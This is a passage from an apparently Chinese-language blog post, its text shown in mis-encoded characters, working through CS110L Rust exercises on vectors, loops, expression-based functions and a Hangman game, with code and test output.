class="hljs-number">3</span>);<br><span class="hljs-comment">// Even here, the &quot;: Vec&lt;i32&gt;&quot; type annotation is optional. If you omit it, the</span><br><span class="hljs-comment">// compiler will look ahead to see how the vector is being used, and from that, it</span><br><span class="hljs-comment">// can infer the type of the vector elements. Neat!</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰“å°å‘é‡çš„æ—¶å€™éœ€è¦ç”¨ <code>&#123;:?&#125;</code> æˆ–è€… <code>&#123;:#?&#125;</code> ï¼Œè€Œä¸èƒ½ä½¿ç”¨é»˜è®¤ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-comment">// let mut v: Vec&lt;i32&gt; = Vec::new();</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">2</span>);<br>    v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,v);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:#?&#125;&quot;</span>,v);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[2, 3]</span><br><span class="hljs-string">[</span><br><span class="hljs-string">    2,</span><br><span class="hljs-string">    3,</span><br><span class="hljs-string">]</span><br></code></pre></td></tr></table></figure><p>Rust çš„æ•°ç»„æŠŠå¤§å°å½“åšç±»å‹çš„ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">arr</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">4</span>] = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>];<br>arr[<span class="hljs-number">0</span>] = -<span class="hljs-number">2</span>;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, arr[<span class="hljs-number">0</span>] + arr[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¿­ä»£å™¨éå†æ•°ç»„ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> v.<span class="hljs-title function_ invoke__">iter</span>() &#123; <span class="hljs-comment">// v is the vector from above</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, i);<br>&#125;<br></code></pre></td></tr></table></figure><p>Rust æ”¯æŒ while å¾ªç¯ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-number">20</span> &#123;<br>    i += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Rust è¿˜æ”¯æŒ <strong>loop</strong> å¾ªç¯ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">loop</span> &#123;<br>    i += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">10</span> &#123; <span class="hljs-keyword">break</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>while å’Œ loop çš„åŒºåˆ«ï¼š</p><ul><li><p><strong>1.</strong> loop å¯ä»¥åœ¨å¾ªç¯æ—¶ç»™æœªåˆå§‹åŒ–çš„å˜é‡èµ‹å€¼è€Œä¸ä¼šæŠ¥é”™</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>    <span class="hljs-keyword">loop</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x0233<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: denote infinite loops with `<span class="hljs-keyword">loop</span> &#123; ... &#125;`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">5</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>  |     ^^^^^^^^^^ help: <span class="hljs-keyword">use</span> `<span class="hljs-keyword">loop</span>`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(while_true)]</span>` on by default<br><br>error[E0381]: used binding `x` is possibly-uninitialized<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">4</span>:<span class="hljs-number">26</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>  |         - binding declared here but left uninitialized<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>  |           ---- <span class="hljs-keyword">if</span> this condition isn<span class="hljs-symbol">&#x27;t</span> met and the `<span class="hljs-keyword">while</span>` <span class="hljs-keyword">loop</span> runs <span class="hljs-number">0</span> times, `x` is not initialized<br><span class="hljs-number">4</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>  |                          ^ `x` used here but it is possibly-uninitialized<br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br></code></pre></td></tr></table></figure></li><li><p><strong>2.</strong> loop å¯ä»¥é€šè¿‡ break æŠŠå€¼ä¼ é€’å‡ºå»ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">counter</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">result</span> = <span class="hljs-keyword">loop</span> &#123;<br>        counter += <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> counter == <span class="hljs-number">10</span> &#123;<br>            <span class="hljs-keyword">break</span> counter * <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">assert_eq!</span>(result, <span class="hljs-number">20</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>æœ€åï¼Œæ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ Rust çš„å‡½æ•°ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Function with return type i32</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(a: <span class="hljs-type">u32</span>, b: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> &#123;<br>    a + b<br>&#125;<br><br><span class="hljs-comment">// Void function (no &quot;-&gt;&quot;)</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// do stuff...</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>,<span class="hljs-title function_ invoke__">sum</span>(<span class="hljs-number">0x1337</span>,<span class="hljs-number">0xc0de</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xd415</span><br></code></pre></td></tr></table></figure><ul><li><p>å’Œå˜é‡ç±»å‹ä¸åŒï¼Œå¦‚æœæœ‰è¿”å›å€¼åˆ™éœ€æ‰‹åŠ¨æŒ‡å®šç±»å‹ã€‚</p></li><li><p>å‡½æ•°ä¸ä»…æ²¡æœ‰ return è¿˜å°‘äº†ä¸ªåˆ†å·ã€‚</p><p>Rust æ˜¯ä¸€ç§åŸºäºè¡¨è¾¾å¼çš„è¯­è¨€ã€‚åœ¨ Rust ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯è¡¨è¾¾å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x = someBool ? <span class="hljs-number">2</span> : <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-keyword">if</span> someBool &#123; <span class="hljs-number">2</span> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">4</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fib</span>(n: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span> &#123; n &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-title function_ invoke__">fib</span>(n-<span class="hljs-number">1</span>) + <span class="hljs-title function_ invoke__">fib</span>(n-<span class="hljs-number">2</span>) &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¥½æ€ªå“¦ï¼ˆbushi</p></li></ul><h3 id="Practice"><a class="header-anchor" href="#Practice">Â¶</a>Practice</h3><p>æ‚¨åº”è¯¥å®ç°ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ul><li>å®ç°<code>add_n</code>ï¼Œå®ƒéœ€è¦ä¸€ä¸ªæ•°å­—å‘é‡å’Œä¸€äº›æ•°å­—<code>n</code>ã€‚è¯¥å‡½æ•°åº”è¿”å›ä¸€ä¸ªæ–°å‘é‡ï¼Œå…¶å…ƒç´ æ˜¯åŸå§‹å‘é‡<code>v</code>ä¸­<code>n</code>æ·»åŠ åˆ°æ¯ä¸ªæ•°å­—çš„æ•°å­—ã€‚</li><li>Implement <code>add_n_inplace</code>ï¼Œå®ƒä¸<code>add_n</code>æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œä½† <code>v</code>ç›´æ¥ï¼ˆå°±åœ°ï¼‰ä¿®æ”¹å¹¶ä¸”ä¸è¿”å›ä»»ä½•å†…å®¹ã€‚</li><li>å®ç°<code>dedup</code>ä»å‘é‡ä¸­åˆ é™¤é‡å¤å…ƒç´ ï¼ˆå³<code>v</code>ç›´æ¥ä¿®æ”¹ï¼‰ã€‚å¦‚æœå…ƒç´ åœ¨å‘é‡ä¸­çš„ä»»ä½•ä½ç½®é‡å¤ï¼Œåˆ™åº”ä¿ç•™æœ€å…ˆå‡ºç°çš„å…ƒç´ ã€‚æ‚¨å¯èƒ½å¸Œæœ›ä¸ºæ­¤ä½¿ç”¨ <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html">HashSet</a>ã€‚</li></ul><p>æ€»ä½“æ¥è¯´å†™çš„è¿˜æ˜¯è›®åˆ«æ‰­çš„ï¼ˆä¸€ä¸ªæ˜¯ mut å®¹æ˜“å¿˜ï¼Œä¸€ä¸ªæ˜¯ <code>&amp;</code> è¿™ä¸ªç©æ„ï¼Œæ¢¦å› C å˜‰å˜‰ğŸ‘¦ğŸ»ï¼‰</p><h4 id="Func1-add-n"><a class="header-anchor" href="#Func1-add-n">Â¶</a>Func1: add_n</h4><p>ä¼ è¿›æ¥çš„æ²¡å¸¦ <code>mut</code> ï¼Œæ–°å¼€ä¸ª vec ç³Šå¼„ä¸€ä¸‹=ã€‚=</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">add_n</span>(v: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;, n: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">new_v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    <span class="hljs-keyword">while</span> i &lt; v.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>        new_v.<span class="hljs-title function_ invoke__">push</span>(v[i] + n);<br>        i += <span class="hljs-number">1</span>;<br>    &#125;<br>    new_v<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Func2-add-n-inplace"><a class="header-anchor" href="#Func2-add-n-inplace">Â¶</a>Func2: add_n_inplace</h4><p>è¿™ä¸ªå°±æ¯”è¾ƒç®€å•äº†ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">add_n_inplace</span>(v: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;, n: <span class="hljs-type">i32</span>) &#123;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> v &#123;<br>        *i += n;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Func3-dedup"><a class="header-anchor" href="#Func3-dedup">Â¶</a>Func3: dedup</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">dedup</span>(v: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">hash</span> = HashSet::<span class="hljs-title function_ invoke__">new</span>(); <br>    v.<span class="hljs-title function_ invoke__">retain_mut</span>(|x| <span class="hljs-keyword">if</span> hash.<span class="hljs-title function_ invoke__">contains</span>(&amp;*x) &#123;<br>        <span class="hljs-literal">false</span> <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        hash.<span class="hljs-title function_ invoke__">insert</span>(*x);<br>        <span class="hljs-literal">true</span><br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>è•¾å§†ï¼Œè¿™ä¸ªç©æ„çœŸçš„æ˜¯æ‘ç¿»<a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.retain_mut">æ–‡æ¡£</a>æŠ„ä½œä¸šçš„ï¼Œä¸å¾—ä¸è¯´ Rust çš„æ–‡æ¡£å¥½åƒæŒºå…¨çš„ğŸ‘¦ğŸ»</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">retain_mut</span>&lt;F&gt;(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, f: F)<br><span class="hljs-keyword">where</span><br>    F: <span class="hljs-title function_ invoke__">FnMut</span>(&amp;<span class="hljs-keyword">mut</span> T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span>,<br>Retains only the elements specified by the predicate, passing a mutable reference to it.<br><br>In other words, remove all elements e such that <span class="hljs-title function_ invoke__">f</span>(&amp;<span class="hljs-keyword">mut</span> e) returns <span class="hljs-literal">false</span>. This method operates <span class="hljs-keyword">in</span> place, visiting each element exactly once <span class="hljs-keyword">in</span> the original order, and preserves the order of the retained elements.<br><br>Examples<br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br>vec.<span class="hljs-title function_ invoke__">retain_mut</span>(|x| <span class="hljs-keyword">if</span> *x &lt;= <span class="hljs-number">3</span> &#123;<br>    *x += <span class="hljs-number">1</span>;<br>    <span class="hljs-literal">true</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-literal">false</span><br>&#125;);<br><span class="hljs-built_in">assert_eq!</span>(vec, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo <span class="hljs-built_in">test</span><br>   Compiling warmup v0.1.0 (/home/nightu/CS110L/cs110l-spr-2020-starter-code/week1/part-2-warmup)<br>    Finished <span class="hljs-built_in">test</span> [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.39s<br>     Running unittests src/main.rs (target/debug/deps/warmup-d4b1472ea897ae12)<br><br>running 3 tests<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_add_n ... ok<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_add_n_inplace ... ok<br><span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>::test_dedup ... ok<br><br><span class="hljs-built_in">test</span> result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished <span class="hljs-keyword">in</span> 0.00s<br></code></pre></td></tr></table></figure><h2 id="Part-3-Hangman"><a class="header-anchor" href="#Part-3-Hangman">Â¶</a>Part 3: Hangman</h2><p>å†™èµ·æ¥ä¹Ÿä¸å¤æ‚ï¼Œä¸»è¦æ˜¯å­—ç¬¦ä¸²çš„æ›¿æ¢æœ‰ç‚¹ (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Simple Hangman Program</span><br><span class="hljs-comment">// User gets five incorrect guesses</span><br><span class="hljs-comment">// Word chosen randomly from words.txt</span><br><span class="hljs-comment">// Inspiration from: https://doc.rust-lang.org/book/ch02-00-guessing-game-tutorial.html</span><br><span class="hljs-comment">// This assignment will introduce you to some fundamental syntax in Rust:</span><br><span class="hljs-comment">// - variable declaration</span><br><span class="hljs-comment">// - string manipulation</span><br><span class="hljs-comment">// - conditional statements</span><br><span class="hljs-comment">// - loops</span><br><span class="hljs-comment">// - vectors</span><br><span class="hljs-comment">// - files</span><br><span class="hljs-comment">// - user input</span><br><span class="hljs-comment">// We&#x27;ve tried to limit/hide Rust&#x27;s quirks since we&#x27;ll discuss those details</span><br><span class="hljs-comment">// more in depth in the coming lectures.</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rand;<br><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::fs;<br><span class="hljs-keyword">use</span> std::io;<br><span class="hljs-keyword">use</span> std::io::Write;<br><br><span class="hljs-keyword">const</span> NUM_INCORRECT_GUESSES: <span class="hljs-type">u32</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> WORDS_PATH: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">&quot;words.txt&quot;</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">pick_a_random_word</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">file_string</span> = fs::<span class="hljs-title function_ invoke__">read_to_string</span>(WORDS_PATH).<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Unable to read file.&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">words</span>: <span class="hljs-type">Vec</span>&lt;&amp;<span class="hljs-type">str</span>&gt; = file_string.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;\n&#x27;</span>).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(words[rand::<span class="hljs-title function_ invoke__">thread_rng</span>().<span class="hljs-title function_ invoke__">gen_range</span>(<span class="hljs-number">0</span>, words.<span class="hljs-title function_ invoke__">len</span>())].<span class="hljs-title function_ invoke__">trim</span>())<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">secret_word</span> = <span class="hljs-title function_ invoke__">pick_a_random_word</span>();<br>    <span class="hljs-comment">// Note: given what you know about Rust so far, it&#x27;s easier to pull characters out of a</span><br>    <span class="hljs-comment">// vector than it is to pull them out of a string. You can get the ith character of</span><br>    <span class="hljs-comment">// secret_word by doing secret_word_chars[i].</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">secret_word_chars</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">char</span>&gt; = secret_word.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-comment">// Uncomment for debugging:</span><br>    <span class="hljs-comment">// println!(&quot;[!Debug] random word: &#123;&#125;&quot;, secret_word);</span><br><br>    <span class="hljs-comment">// Your code here! :)</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Welcome to CS110L Hangman!&quot;</span>);<br>    <span class="hljs-comment">// Main</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">r_cnt</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">l_cnt</span> = NUM_INCORRECT_GUESSES;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">length</span> = secret_word.<span class="hljs-title function_ invoke__">len</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">now_guesss</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">with_capacity</span>(length);<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..length &#123;<br>        now_guesss.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">while</span> (r_cnt != length) &amp;&amp; (l_cnt &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The word so far is &#123;&#125;&quot;</span>, now_guesss);<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You have &#123;&#125; guesses left&quot;</span>, l_cnt);<br>        <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;Please guess a letter: &quot;</span>);<br>        <span class="hljs-comment">// Make sure the prompt from the previous 